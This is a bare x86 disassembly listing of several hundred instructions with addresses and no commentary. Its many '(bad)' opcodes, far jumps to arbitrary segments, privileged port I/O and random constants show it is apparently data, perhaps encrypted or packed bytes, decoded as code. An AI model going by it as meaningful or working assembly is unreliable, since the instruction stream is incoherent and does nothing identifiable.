  418e27:	cdq    
  418e28:	jecxz  0x418e5c
  418e2a:	jns    0x418e43
  418e2c:	or     DWORD PTR ds:0x6c8eaa82,0xffffffe2
  418e33:	xor    DWORD PTR [edi],eax
  418e35:	jno    0x418ead
  418e37:	je     0x418eb6
  418e39:	jb     0x418de5
  418e3b:	sbb    BYTE PTR [edi],0xe2
  418e3e:	loope  0x418dcf
  418e40:	mov    edx,ebx
  418e42:	aas    
  418e43:	adc    DWORD PTR [edx+0x4e],0x27a297cf
  418e4a:	lods   al,BYTE PTR ds:[esi]
  418e4b:	fimul  WORD PTR [ecx]
  418e4d:	dec    edx
  418e4e:	imul   esp,edx,0x9d0928d9
  418e54:	loopne 0x418e91
  418e56:	ror    BYTE PTR [ecx+0x21],cl
  418e59:	js     0x418de8
  418e5b:	mov    ds:0xc1e22f20,eax
  418e60:	mov    eax,ds:0x5d35df1d
  418e65:	pop    es
  418e66:	mov    ebp,0x74c8f33b
  418e6b:	inc    eax
  418e6c:	stos   BYTE PTR es:[edi],al
  418e6d:	leave  
  418e6e:	mov    esi,0xdc5e3070
  418e73:	xchg   DWORD PTR [esi],ebx
  418e75:	les    esi,FWORD PTR [edx+0x46d1129d]
  418e7b:	jne    0x418eed
  418e7d:	jg     0x418e72
  418e7f:	cld    
  418e80:	mov    fs,WORD PTR [esi+0x181ceb0f]
  418e86:	mov    cs,edx
  418e88:	sub    DWORD PTR [edi-0x94b0992],edx
  418e8e:	mov    ch,0x90
  418e90:	retf   
  418e91:	popf   
  418e92:	dec    esi
  418e93:	sbb    eax,0x67f3be06
  418e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e99:	mov    WORD PTR [ebx],ds
  418e9b:	js     0x418ebd
  418e9d:	cli    
  418e9e:	pusha  
  418e9f:	aaa    
  418ea0:	mov    dl,0x5b
  418ea2:	mov    edx,0x806aa782
  418ea7:	outs   dx,BYTE PTR ds:[esi]
  418ea8:	jae    0x418eb4
  418eaa:	test   al,0x4
  418eac:	pop    edi
  418ead:	dec    esi
  418eaf:	pop    ss
  418eb0:	out    0x10,al
  418eb2:	dec    ecx
  418eb3:	ret    
  418eb4:	pop    esp
  418eb5:	and    al,BYTE PTR [ecx-0x6d]
  418eb8:	dec    ebp
  418eb9:	lock xchg BYTE PTR [edx-0x48b8c416],cl
  418ec0:	mov    bh,0x64
  418ec2:	cwde   
  418ec3:	cwde   
  418ec4:	pop    ecx
  418ec5:	dec    eax
  418ec6:	retf   0xb200
  418ec9:	adc    DWORD PTR [eax-0x24fad30b],eax
  418ecf:	or     ch,BYTE PTR [edi+0x69227c90]
  418ed5:	cmp    ecx,DWORD PTR [esi]
  418ed7:	inc    edi
  418ed8:	out    0x95,al
  418eda:	addr16 test eax,0x725ff41b
  418ee0:	ret    
  418ee1:	jle    0x418eef
  418ee3:	js     0x418e77
  418ee5:	pop    eax
  418ee6:	xchg   esi,eax
  418ee7:	fs pop eax
  418ee9:	cli    
  418eea:	dec    esp
  418eeb:	(bad)  
  418eec:	sub    ecx,DWORD PTR [edi]
  418eee:	sub    ebp,DWORD PTR [ebx-0x38f13eb6]
  418ef4:	test   BYTE PTR [edi-0x6d],cl
  418ef7:	(bad)  
  418ef9:	push   ss
  418efa:	pop    esi
  418efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418efc:	or     DWORD PTR [edi+edx*4-0x5d],0x7693fa9f
  418f04:	and    dl,BYTE PTR [eax-0x6a60113f]
  418f0a:	bound  edx,QWORD PTR [eax]
  418f0c:	outs   dx,DWORD PTR ds:[esi]
  418f0d:	fmul   st,st(1)
  418f0f:	mov    esp,0x95a9e4bd
  418f14:	mov    al,0x41
  418f16:	aas    
  418f17:	jo     0x418ed1
  418f19:	mov    bl,0x58
  418f1b:	jo     0x418eec
  418f1d:	out    0x3f,eax
  418f1f:	retf   
  418f20:	sub    ch,BYTE PTR [ebp-0x49]
  418f23:	gs (bad) 
  418f25:	inc    esp
  418f26:	sub    dl,ah
  418f28:	jb     0x418f83
  418f2a:	mov    dl,0x59
  418f2c:	aam    0x6e
  418f2e:	and    BYTE PTR [ebx+0x1],cl
  418f31:	xchg   ecx,eax
  418f32:	js     0x418fa7
  418f34:	add    dh,ah
  418f36:	xchg   ebp,eax
  418f37:	arpl   WORD PTR [ebx-0x7a],sp
  418f3a:	adc    DWORD PTR [esp+eax*2+0x54e44fb6],ebp
  418f41:	ret    
  418f42:	sti    
  418f43:	push   esp
  418f44:	cmp    bh,BYTE PTR [edx+0x4f67b70]
  418f4a:	(bad)  
  418f4b:	sub    bh,dh
  418f4d:	(bad)  
  418f4f:	in     eax,0xdd
  418f51:	lea    esi,[edx-0x1c]
  418f54:	and    al,0xb3
  418f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f57:	daa    
  418f58:	cmp    ebp,DWORD PTR [esi+0x68]
  418f5b:	adc    al,0x5b
  418f5d:	or     eax,0x4ea60edf
  418f62:	imul   ebx,DWORD PTR [esi-0x5d],0x2d
  418f66:	add    DWORD PTR [eax-0x86a7a61],esp
  418f6c:	xchg   ecx,eax
  418f6d:	jg     0x418fcf
  418f6f:	fidivr DWORD PTR [edx-0x47]
  418f72:	xchg   esi,eax
  418f73:	sub    esi,DWORD PTR [esi-0x1c]
  418f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f77:	and    ebx,DWORD PTR [ecx-0x6059d9]
  418f7d:	sar    BYTE PTR [eax],cl
  418f7f:	bound  ebx,QWORD PTR [edi-0x71237745]
  418f85:	shl    BYTE PTR [ecx],cl
  418f87:	pop    es
  418f88:	pop    ds
  418f89:	add    eax,0xc779e01
  418f8e:	ja     0x418f15
  418f90:	int3   
  418f91:	jmp    0x2c00:0x8a770e86
  418f98:	hlt    
  418f99:	ins    BYTE PTR es:[edi],dx
  418f9a:	xlat   BYTE PTR ds:[ebx]
  418f9b:	sub    al,0xf6
  418f9d:	adc    ch,al
  418f9f:	pop    esp
  418fa0:	or     ah,al
  418fa2:	mov    al,ds:0x9777eeb3
  418fa7:	jecxz  0x418f86
  418fa9:	ds mov dh,0x2d
  418fac:	adc    BYTE PTR [edi-0x4891f8b2],dh
  418fb2:	inc    eax
  418fb3:	and    eax,0xfbddbbe3
  418fb8:	add    bh,0xcf
  418fbb:	enter  0xb352,0x93
  418fbf:	adc    DWORD PTR [eax+0x47],ebx
  418fc2:	mov    ecx,0xe3afab35
  418fc7:	jnp    0x419046
  418fc9:	cmc    
  418fca:	mov    al,0x22
  418fcc:	stos   BYTE PTR es:[edi],al
  418fcd:	mov    ds:0x91302e28,eax
  418fd2:	jl     0x419048
  418fd4:	aaa    
  418fd5:	sub    ecx,DWORD PTR [esi]
  418fd7:	mov    bh,BYTE PTR [edx+esi*8-0x19]
  418fdb:	pop    eax
  418fdc:	jge    0x418fac
  418fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fdf:	test   eax,0x9e493bd7
  418fe4:	mov    cl,al
  418fe6:	test   bh,0x9d
  418fe9:	mov    cl,0x7c
  418feb:	push   esi
  418fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fed:	and    dh,BYTE PTR [eax+0x7b]
  418ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ff1:	mov    eax,0x8a4450eb
  418ff6:	popa   
  418ff7:	in     eax,0x6e
  418ff9:	push   esp
  418ffa:	mov    bl,0x9c
  418ffc:	in     eax,dx
  418ffd:	mov    edx,0x3d9df1e7
  419002:	fdiv   DWORD PTR [eax+eiz*2+0x53ad7255]
  419009:	xchg   esp,eax
  41900a:	dec    esi
  41900b:	sub    BYTE PTR [ecx],ah
  41900d:	(bad)  
  41900e:	dec    ebx
  41900f:	scas   al,BYTE PTR es:[edi]
  419010:	pop    edi
  419011:	cmp    DWORD PTR [ecx+0xdd3b4c4],ebx
  419017:	rcl    esi,0x57
  41901a:	xchg   esi,eax
  41901b:	jle    0x418fd1
  41901d:	dec    edx
  41901e:	xchg   esi,eax
  41901f:	aam    0x4c
  419021:	inc    ebx
  419022:	mov    ch,BYTE PTR [edi]
  419024:	mov    eax,ds:0x3637b19f
  419029:	inc    esi
  41902a:	fidiv  DWORD PTR [ebx+edx*1]
  41902d:	sbb    DWORD PTR [edi],ebx
  41902f:	mov    ah,0xff
  419031:	xchg   DWORD PTR [edx+0x2a],esi
  419034:	mov    cl,0xd2
  419036:	pop    ebp
  419037:	ins    BYTE PTR es:[edi],dx
  419038:	retf   
  419039:	xchg   edi,eax
  41903a:	inc    ecx
  41903b:	call   0x82df:0xba36017f
  419042:	mov    bl,0x73
  419044:	push   eax
  419045:	mov    esi,0x283c55c7
  41904a:	sub    ebx,esi
  41904c:	sbb    BYTE PTR [ebp+0x51],bh
  41904f:	lods   eax,DWORD PTR ds:[esi]
  419050:	int3   
  419051:	cwde   
  419052:	mov    bl,0x51
  419054:	sbb    ebx,ecx
  419056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419057:	dec    eax
  419058:	sbb    al,0x30
  41905a:	into   
  41905b:	(bad)  
  41905c:	dec    esi
  41905d:	jmp    0x995c3ff8
  419062:	out    dx,eax
  419063:	fnstsw WORD PTR [esp+eiz*4-0x35]
  419067:	leave  
  419068:	mov    eax,ds:0x5b5bd7a8
  41906d:	dec    eax
  41906e:	mov    ch,0x1e
  419070:	fsub   DWORD PTR [ecx-0x6d62c1c8]
  419076:	out    dx,al
  419077:	jbe    0x41907c
  419079:	jne    0x41906b
  41907b:	popf   
  41907c:	fsub   st,st(0)
  41907e:	sbb    al,0xf4
  419080:	sti    
  419081:	and    al,BYTE PTR [ebx]
  419083:	lods   eax,DWORD PTR ds:[esi]
  419084:	adc    edi,ecx
  419086:	dec    edx
  419087:	cmc    
  419088:	jb     0x419091
  41908a:	xchg   ecx,eax
  41908b:	retf   
  41908c:	mov    ecx,DWORD PTR [edx]
  41908e:	jae    0x419085
  419090:	fistp  WORD PTR [edi-0x7f5d535b]
  419096:	push   esp
  419097:	push   ebp
  419098:	loopne 0x419115
  41909a:	sbb    BYTE PTR [edi+0x39e1ba9],bl
  4190a0:	sub    al,0xfb
  4190a2:	in     al,dx
  4190a3:	jmp    0x5236:0xc663dea9
  4190aa:	push   esp
  4190ab:	dec    eax
  4190ac:	je     0x419049
  4190ae:	adc    ah,BYTE PTR [esp+edi*4]
  4190b1:	mov    dl,0xc0
  4190b3:	fs es aaa 
  4190b6:	jbe    0x419092
  4190b8:	inc    edx
  4190b9:	ret    
  4190ba:	xchg   BYTE PTR [esi],dh
  4190bc:	jno    0x4190f9
  4190be:	pushf  
  4190bf:	sub    edi,DWORD PTR [ecx]
  4190c1:	aad    0x54
  4190c3:	mov    ds:0x6f62517f,al
  4190c8:	(bad)  
  4190c9:	pop    edi
  4190ca:	shl    ch,cl
  4190cc:	or     al,0xd8
  4190ce:	inc    edi
  4190cf:	scas   al,BYTE PTR es:[edi]
  4190d0:	inc    ebx
  4190d1:	mov    cl,0x1f
  4190d3:	or     esp,DWORD PTR [edx+esi*1-0x2f6d10f4]
  4190da:	or     BYTE PTR [esi-0xa0c7202],0x39
  4190e1:	test   BYTE PTR ds:[edx-0x1a],0x2b
  4190e6:	pop    ss
  4190e7:	mov    edi,DWORD PTR [esi]
  4190e9:	jg     0x4190ed
  4190eb:	xchg   ecx,eax
  4190ec:	add    dh,bh
  4190ee:	arpl   WORD PTR [edi-0x39],di
  4190f1:	dec    ecx
  4190f2:	retf   0xa373
  4190f5:	sbb    dh,BYTE PTR [eax+0x4e52608a]
  4190fb:	clc    
  4190fc:	std    
  4190fd:	daa    
  4190fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190ff:	push   0xffffff85
  419101:	adc    ecx,DWORD PTR [edi+esi*1+0x77]
  419105:	adc    BYTE PTR [edx-0x3957d3a8],0x64
  41910c:	pop    eax
  41910d:	pop    edx
  41910e:	(bad)  
  41910f:	jle    0x419108
  419111:	ins    DWORD PTR es:[edi],dx
  419112:	hlt    
  419113:	dec    edi
  419114:	ins    BYTE PTR es:[edi],dx
  419115:	mov    ebx,0x13c54465
  41911a:	mul    DWORD PTR [edx]
  41911c:	(bad)  
  41911d:	fnsetpm(287 only) 
  41911f:	jle    0x419154
  419121:	add    eax,0x2ecccae8
  419126:	mov    eax,0x47002c0f
  41912b:	inc    eax
  41912c:	pop    es
  41912d:	jae    0x4190cc
  41912f:	push   esp
  419130:	nop
  419131:	daa    
  419132:	pop    ds
  419133:	pop    esp
  419134:	mov    dl,0x75
  419136:	and    DWORD PTR ss:[eax],0xcd9e886
  41913d:	jl     0x419162
  41913f:	and    cl,BYTE PTR [ecx+0x44]
  419142:	stos   DWORD PTR es:[edi],eax
  419143:	add    DWORD PTR [edi+ebx*2],eax
  419146:	out    dx,al
  419147:	mov    esi,0x63f3ef8d
  41914c:	imul   edx,DWORD PTR [edx-0x54893797],0xffffffbd
  419153:	mov    ebp,0xa24c8214
  419158:	das    
  419159:	popf   
  41915a:	inc    edi
  41915b:	cmp    BYTE PTR [ecx],0x71
  41915e:	aas    
  41915f:	cmp    ecx,DWORD PTR [ebp+0x15]
  419162:	dec    esi
  419163:	dec    ebx
  419164:	popa   
  419165:	cmp    bl,dl
  419167:	inc    eax
  419168:	shr    bl,cl
  41916a:	test   ebp,edi
  41916c:	xor    eax,0x31505093
  419171:	test   BYTE PTR [edi],al
  419173:	aam    0x8f
  419175:	jle    0x4191e8
  419177:	jbe    0x419163
  419179:	add    eax,ebx
  41917b:	mov    edx,0x99ea7f3f
  419180:	out    0xa8,eax
  419182:	out    dx,eax
  419183:	sbb    al,0xf7
  419185:	add    eax,0xe106ac00
  41918a:	lods   eax,DWORD PTR fs:[esi]
  41918c:	and    ebx,DWORD PTR [ebp+0x544f7942]
  419192:	retf   
  419193:	jp     0x419123
  419195:	call   0x4ca9:0x58c6f0bf
  41919c:	pusha  
  41919d:	or     ch,BYTE PTR [esi-0x33]
  4191a0:	jnp    0x4191e5
  4191a2:	xor    cl,0x6a
  4191a5:	inc    esp
  4191a6:	jg     0x4191c0
  4191a8:	or     eax,0x83e9e66e
  4191ad:	test   eax,0xdb8cc0f4
  4191b2:	rcl    DWORD PTR [edi],1
  4191b4:	sbb    al,0xf1
  4191b6:	es rcr BYTE PTR fs:0x259e8628,cl
  4191be:	mov    WORD PTR [esi],cs
  4191c0:	push   esi
  4191c1:	call   0x8bf1:0x97683f80
  4191c8:	mov    dh,BYTE PTR [edi]
  4191ca:	rol    BYTE PTR [esi+0x1199b279],cl
  4191d0:	stos   BYTE PTR es:[edi],al
  4191d1:	mov    edx,0xb3d469c3
  4191d6:	xor    ebp,edx
  4191d8:	jge    0x41917f
  4191da:	pop    edi
  4191db:	pop    ebx
  4191dc:	inc    esp
  4191dd:	dec    eax
  4191de:	jae    0x4191b1
  4191e0:	jmp    0x9cb3:0x2199933a
  4191e7:	rcl    esp,1
  4191e9:	pop    ebx
  4191ea:	clc    
  4191eb:	xor    al,0xbe
  4191ed:	mov    dh,BYTE PTR [edx]
  4191ef:	jns    0x4191c8
  4191f1:	ss push esp
  4191f3:	pop    edx
  4191f4:	sbb    ch,0xc6
  4191f7:	inc    ebx
  4191f8:	call   0xd4b94bd3
  4191fd:	push   ebx
  4191fe:	dec    edx
  4191ff:	ds cmp bl,ah
  419202:	pop    ebp
  419203:	push   0x2a
  419205:	and    BYTE PTR [ebp+0x2b],0xb
  419209:	dec    edx
  41920a:	loope  0x419205
  41920c:	(bad)  
  41920d:	dec    edx
  41920e:	js     0x4191e3
  419210:	and    al,0x2d
  419212:	mov    esp,0x54dbd5f5
  419217:	mov    eax,0x2bf69687
  41921c:	fwait
  41921d:	(bad)  
  41921e:	out    dx,al
  41921f:	or     ch,BYTE PTR [esi+edi*2-0x52]
  419223:	mov    WORD PTR [esi+0x7b4415ee],ds
  419229:	add    DWORD PTR [eax-0x129fb467],esi
  41922f:	push   ss
  419230:	imul   ecx,ebx,0x55
  419233:	xor    DWORD PTR [edi-0x1e],esp
  419236:	push   es
  419237:	or     BYTE PTR [edx-0x154eb908],cl
  41923d:	cmc    
  41923e:	xor    BYTE PTR [eax+0x6620db28],bl
  419244:	stos   DWORD PTR es:[edi],eax
  419245:	pop    ds
  419246:	mov    dl,0xb0
  419248:	leave  
  419249:	fisub  WORD PTR [edx+0x60ab55c6]
  41924f:	jp     0x419262
  419251:	jbe    0x4192cf
  419253:	sbb    dl,BYTE PTR [ebp-0x15]
  419256:	mov    dl,0xc8
  419258:	pop    ss
  419259:	mov    eax,0xad014883
  41925e:	cmp    BYTE PTR ds:0x3319622e,0x46
  419265:	and    eax,0xa981109b
  41926a:	pop    ebp
  41926b:	cmp    eax,0x89401319
  419270:	mov    al,ds:0x1f7a38d
  419275:	add    DWORD PTR [edi],ebp
  419277:	jae    0x4192e0
  419279:	sub    BYTE PTR [ebp-0x674f4f67],0xf9
  419280:	inc    ebp
  419281:	xchg   DWORD PTR [esi],ebx
  419283:	ins    BYTE PTR es:[edi],dx
  419284:	push   eax
  419285:	inc    edi
  419286:	aas    
  419287:	or     edx,DWORD PTR [esi]
  419289:	xchg   esi,eax
  41928a:	pop    ebx
  41928b:	adc    al,0xe7
  41928d:	sahf   
  41928e:	popf   
  41928f:	xor    DWORD PTR [edi],ecx
  419291:	mov    ds:0xdf84d545,eax
  419296:	ins    BYTE PTR es:[edi],dx
  419297:	ror    DWORD PTR [ebp-0x79a621c6],cl
  41929d:	clc    
  41929e:	adc    BYTE PTR [edx+0x1b9007e4],bh
  4192a4:	fmul   st,st(0)
  4192a6:	mov    es,esi
  4192a8:	ret    0xca9d
  4192ab:	xchg   DWORD PTR [ebp+0x7f],edi
  4192ae:	push   cs
  4192af:	nop
  4192b0:	pushf  
  4192b1:	adc    al,dl
  4192b3:	jo     0x419257
  4192b5:	bound  ebx,QWORD PTR [esi+0x3d]
  4192b8:	imul   ebx,DWORD PTR [esp+ecx*8+0x3],0x64e50a89
  4192c0:	xor    eax,0xeb7d0341
  4192c5:	gs push ds
  4192c7:	pusha  
  4192c8:	add    ah,cl
  4192ca:	stos   DWORD PTR es:[edi],eax
  4192cb:	push   edx
  4192cc:	ficom  WORD PTR [ebx+0x58ffad4e]
  4192d2:	enter  0xe0a1,0x58
  4192d6:	or     bl,BYTE PTR [edi+0x8]
  4192d9:	call   0xf0ee:0x7dfc607c
  4192e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192e1:	jno    0x419337
  4192e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192e4:	push   0xab6c9fd4
  4192e9:	or     esi,eax
  4192eb:	adc    ebx,ebx
  4192ed:	pop    eax
  4192ee:	scas   al,BYTE PTR es:[edi]
  4192ef:	lods   al,BYTE PTR ds:[esi]
  4192f0:	inc    eax
  4192f1:	loopne 0x41931b
  4192f3:	mov    edi,0x5de7269d
  4192f8:	je     0x4192a2
  4192fa:	sahf   
  4192fb:	scas   eax,DWORD PTR es:[edi]
  4192fc:	and    ch,dl
  4192fe:	add    al,0xdb
  419300:	adc    ah,0xf4
  419303:	in     al,0xd8
  419305:	aaa    
  419306:	les    ecx,FWORD PTR [esp+ecx*2+0x5e6f64c6]
  41930d:	sub    ch,al
  41930f:	js     0x4192c9
  419311:	fimul  DWORD PTR [esp+edx*4+0x45]
  419315:	sub    eax,0xd8e61bed
  41931a:	xor    DWORD PTR [ecx+edx*1-0x5365f48f],ebx
  419321:	push   eax
  419322:	aas    
  419323:	xchg   esi,eax
  419324:	shl    BYTE PTR [ecx],0x43
  419327:	stos   BYTE PTR es:[edi],al
  419328:	pop    edi
  419329:	sbb    edx,DWORD PTR [esi]
  41932b:	rcr    DWORD PTR ds:0xa775a548,1
  419331:	sahf   
  419332:	stos   BYTE PTR es:[edi],al
  419333:	ret    0xd07f
  419336:	loopne 0x4193b0
  419338:	mov    ebx,0xf3cf415
  41933d:	inc    esi
  41933e:	push   0x57
  419340:	pushf  
  419341:	imul   esp,DWORD PTR [edx*1-0x5ab98dc0],0x40
  419349:	add    eax,0x470ba96
  41934e:	(bad)  
  41934f:	inc    ebx
  419351:	dec    ebp
  419352:	dec    edi
  419353:	xchg   esi,eax
  419354:	and    al,0xa4
  419356:	dec    edx
  419357:	sbb    al,0x9e
  419359:	cmp    DWORD PTR ds:[edi+0x47],esi
  41935d:	inc    ebp
  41935e:	mov    al,ds:0xffb2408e
  419363:	add    DWORD PTR [edx+0x8],esp
  419366:	and    al,0x69
  419368:	pop    eax
  419369:	test   BYTE PTR [eax+0x16],ch
  41936c:	lahf   
  41936d:	jno    0x419368
  41936f:	jge    0x41938a
  419371:	cmp    eax,0x225f382c
  419376:	in     eax,0x8e
  419378:	fucomi st,st(4)
  41937a:	inc    edi
  41937b:	retf   
  41937c:	mov    al,ds:0x7e2cd787
  419381:	into   
  419382:	outs   dx,BYTE PTR ds:[esi]
  419383:	call   0xd448707a
  419388:	push   edx
  419389:	sub    al,0xd
  41938b:	push   0x62da50ab
  419390:	data16 aam 0x49
  419393:	xor    BYTE PTR [esi-0x4135558e],al
  419399:	lds    ebx,FWORD PTR [esp+eax*2-0x39]
  41939d:	dec    esp
  41939e:	xchg   esi,eax
  41939f:	add    al,0x48
  4193a1:	mul    DWORD PTR [ebx-0x4f]
  4193a4:	sub    al,bh
  4193a6:	test   DWORD PTR [esp+ebp*1+0x440fa1e1],0x2c6deca7
  4193b1:	rcr    BYTE PTR [ebp-0x2efb5021],1
  4193b7:	mov    esi,0x488e3f0d
  4193bc:	(bad)  
  4193bd:	mov    ebp,0xe1cfa748
  4193c2:	rcl    BYTE PTR [edx+ebx*1],0xdb
  4193c6:	add    eax,0xa760a1d1
  4193cb:	mov    fs:0xa74664ea,eax
  4193d1:	push   ebx
  4193d2:	jae    0x419415
  4193d4:	ret    
  4193d5:	scas   al,BYTE PTR es:[edi]
  4193d6:	fdivr  QWORD PTR [ecx]
  4193d8:	jno    0x4193b5
  4193da:	pop    edx
  4193db:	xchg   edx,eax
  4193dc:	inc    ebp
  4193dd:	(bad)
  4193e0:	jo     0x4193ff
  4193e2:	and    al,BYTE PTR [edx-0x1b0ba1ce]
  4193e8:	xlat   BYTE PTR ds:[ebx]
  4193e9:	mov    DWORD PTR [esi+0x6d],ebp
  4193ec:	inc    esi
  4193ed:	xchg   esp,eax
  4193ee:	push   edx
  4193ef:	sti    
  4193f0:	fisubr DWORD PTR [edx]
  4193f2:	sbb    eax,0xf6d5e4b6
  4193f7:	and    BYTE PTR [ebp+0x2c3d3e90],0x8a
  4193fe:	ret    0x8771
  419401:	sub    edi,DWORD PTR [edx+0x52]
  419404:	and    al,0xd0
  419406:	out    0xe1,eax
  419408:	rcl    edi,0xce
  41940b:	shr    BYTE PTR [esi-0x7233ba2],0xa6
  419412:	lahf   
  419413:	mov    eax,0x4be2e490
  419418:	push   edi
  419419:	sbb    BYTE PTR [edi-0x657ababc],0x58
  419420:	xchg   BYTE PTR [eax-0x67],al
  419423:	test   eax,0x9956b6a8
  419428:	sbb    ebx,DWORD PTR [edx-0x70]
  41942b:	mov    al,ds:0x4f0d11e9
  419430:	mov    eax,ds:0x7a3b984b
  419435:	push   edi
  419436:	imul   ebp,ecx,0xffffffb7
  419439:	sbb    edi,ebx
  41943b:	jmp    0x30236e90
  419440:	addr16 (bad) 
  419442:	jb     0x419409
  419444:	into   
  419445:	aam    0xf9
  419447:	cmc    
  419448:	mov    ds:0x69e2e61a,al
  41944d:	xor    DWORD PTR [esp+edi*1+0x1b],esp
  419451:	sub    eax,0xfcfbef4f
  419456:	ss gs clc 
  419459:	arpl   WORD PTR [edi+0x666e2a91],ax
  41945f:	cdq    
  419460:	push   ecx
  419461:	xchg   ebx,eax
  419462:	xchg   edx,eax
  419463:	wbinvd 
  419465:	pushf  
  419466:	in     eax,0xc3
  419468:	enter  0xf3a1,0xb1
  41946c:	popa   
  41946d:	sub    al,0xbf
  41946f:	int    0x2f
  419471:	dec    ebp
  419472:	mov    ecx,0x876a18ca
  419477:	pusha  
  419478:	aaa    
  419479:	test   DWORD PTR [ecx+ebp*4],esi
  41947c:	push   esi
  41947d:	gs xchg ebx,eax
  41947f:	fdivr  DWORD PTR [edi+eax*4]
  419482:	xchg   ecx,eax
  419483:	pop    ecx
  419484:	nop
  419485:	cmp    edi,DWORD PTR [edx+edi*4+0x59]
  419489:	ds mov edi,0x4b8b7608
  41948f:	idiv   DWORD PTR [esi-0x29]
  419492:	nop
  419493:	pop    esi
  419494:	sub    ch,BYTE PTR [edi+0x6e96f128]
  41949a:	sub    bl,dh
  41949c:	pop    ss
  41949d:	mov    al,0x37
  41949f:	cmp    al,0xee
  4194a1:	sub    al,0x6d
  4194a3:	jnp    0x419483
  4194a5:	dec    edi
  4194a6:	mov    ah,0x79
  4194a8:	jp     0x41943e
  4194aa:	xchg   ebx,eax
  4194ab:	and    ecx,DWORD PTR [edx+0x77]
  4194ae:	xor    eax,DWORD PTR [eax]
  4194b0:	daa    
  4194b1:	js     0x41944c
  4194b3:	(bad)
  4194b8:	ffreep st(6)
  4194ba:	scas   eax,DWORD PTR es:[edi]
  4194bb:	(bad)  
  4194bc:	ja     0x4194ba
  4194be:	pop    ebp
  4194bf:	pop    ds
  4194c0:	fs sub esi,ebp
  4194c3:	jne    0x419499
  4194c5:	jno    0x419474
  4194c7:	pop    esp
  4194c8:	call   0xa147:0xb93a1f7b
  4194cf:	xchg   edx,eax
  4194d0:	arpl   si,bx
  4194d2:	jno    0x419502
  4194d4:	adc    eax,esp
  4194d6:	gs dec ebp
  4194d8:	into   
  4194d9:	sbb    eax,0xdb2fe33
  4194de:	dec    ebx
  4194df:	out    0x8d,eax
  4194e1:	imul   eax,DWORD PTR [ecx-0x300874d4],0xa624fc57
  4194eb:	sbb    eax,edx
  4194ed:	push   es
  4194ee:	test   eax,0x9d5fe814
  4194f3:	mov    edi,0x89559a69
  4194f8:	js     0x419480
  4194fa:	outs   dx,DWORD PTR ds:[esi]
  4194fb:	jmp    0x6247:0x6c3dc7a9
  419502:	sbb    ecx,edi
  419504:	inc    eax
  419505:	xchg   edi,eax
  419506:	jns    0x4194c1
  419508:	popf   
  419509:	add    eax,DWORD PTR [esi]
  41950b:	and    dl,BYTE PTR [esi-0x6e]
  41950e:	repz repnz repz cmp BYTE PTR [ebp+0x27],ch
  419514:	push   ds
  419515:	push   eax
  419516:	xchg   BYTE PTR [ebx+0xb6ad14b],ah
  41951c:	test   DWORD PTR [ebp+0x4f],0xf47dc862
  419523:	lods   al,BYTE PTR ds:[esi]
  419524:	xchg   BYTE PTR [edx+0x3a],al
  419527:	and    eax,esi
  419529:	push   ebx
  41952a:	xchg   ecx,eax
  41952b:	cmp    DWORD PTR [edi],0x2d
  41952e:	loope  0x419510
  419530:	or     eax,0x60b8d79d
  419535:	mov    edx,0x203fd358
  41953a:	dec    ecx
  41953b:	inc    ebx
  41953c:	or     eax,0x7b9b0b8a
  419541:	jmp    0xebce:0x75468d28
  419548:	dec    eax
  419549:	jl     0x4195a3
  41954b:	mul    DWORD PTR [edi-0x78]
  41954e:	push   ecx
  41954f:	inc    esi
  419550:	sub    eax,0xd338e9c9
  419555:	leave  
  419556:	call   0xf2fe:0x5340016e
  41955d:	or     al,0x76
  41955f:	ret    
  419560:	icebp  
  419561:	push   ds
  419562:	sub    edi,DWORD PTR [edx]
  419564:	loope  0x4195b2
  419566:	fs adc al,0xb2
  419569:	ss ret 
  41956b:	adc    DWORD PTR [edi],0x49
  41956e:	cs sahf 
  419570:	adc    ch,bh
  419572:	xchg   edi,eax
  419573:	stc    
  419574:	test   al,0xf8
  419576:	or     cl,0x8a
  419579:	mov    edx,0x4629e4fe
  41957e:	jp     0x419563
  419580:	sub    al,0xb7
  419582:	scas   eax,DWORD PTR es:[edi]
  419583:	sub    esp,DWORD PTR [ebx]
  419585:	xchg   esp,eax
  419586:	ss jns 0x4195ca
  419589:	push   ecx
  41958a:	retf   0xa86
  41958d:	and    ah,BYTE PTR [ebx]
  41958f:	loopne 0x419554
  419591:	pop    ebp
  419592:	in     al,0x77
  419594:	out    0xac,al
  419596:	xor    eax,0xf71ce01
  41959b:	aaa    
  41959c:	pop    esp
  41959d:	out    0x8,eax
  41959f:	push   edi
  4195a0:	fisttp QWORD PTR [ebx-0x5a]
  4195a3:	add    ebp,DWORD PTR [ebx]
  4195a5:	bound  esi,QWORD PTR [ebx-0x4c]
  4195a8:	icebp  
  4195a9:	loopne 0x419622
  4195ab:	adc    ch,dh
  4195ad:	outs   dx,DWORD PTR ds:[esi]
  4195ae:	mov    bl,BYTE PTR [eax]
  4195b0:	pop    esi
  4195b1:	(bad)  [edx+0x46]
  4195b4:	repz xor dh,BYTE PTR [eax-0x46]
  4195b8:	mov    BYTE PTR [eax+0x8],al
  4195bb:	mov    ah,BYTE PTR [esi+0x5c]
  4195be:	sbb    al,0xe8
  4195c0:	out    dx,al
  4195c1:	inc    esp
  4195c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195c3:	ss pop esi
  4195c5:	popf   
  4195c6:	xor    BYTE PTR [ebx],al
  4195c8:	stc    
  4195c9:	add    bh,BYTE PTR [esi+ecx*2+0x1243729c]
  4195d0:	push   ebx
  4195d1:	fistp  QWORD PTR [eax-0x11]
  4195d4:	punpckhdq mm5,QWORD PTR [ecx]
  4195d7:	mov    edi,0x84d1e8c8
  4195dc:	neg    eax
  4195de:	in     eax,0x88
  4195e0:	ret    
  4195e1:	xchg   ecx,eax
  4195e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195e3:	pop    ebp
  4195e4:	pop    ecx
  4195e5:	rcl    BYTE PTR [ebx+0x21fa7af0],1
